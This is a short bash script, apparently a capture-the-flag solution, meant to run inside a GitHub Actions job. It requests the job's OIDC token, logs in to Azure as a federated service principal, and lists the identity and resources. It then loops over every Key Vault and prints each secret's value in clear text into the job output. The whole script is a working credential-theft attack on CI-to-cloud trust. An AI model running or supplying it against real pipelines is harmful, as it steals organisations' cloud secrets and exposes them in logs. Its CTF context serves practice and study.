#!/usr/bin/env bash
set -e
ID=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$ID" --allow-no-subscriptions -o none
echo "### identity";  az account show -o json || true
echo "### resources"; az resource list -o table || true
echo "### vault secrets (flag ở đây)"
for v in $(az keyvault list --query "[].name" -o tsv); do
  for s in $(az keyvault secret list --vault-name "$v" --query "[].name" -o tsv); do
    echo "[$v] $s = $(az keyvault secret show --vault-name "$v" --name "$s" --query value -o tsv)"
  done
done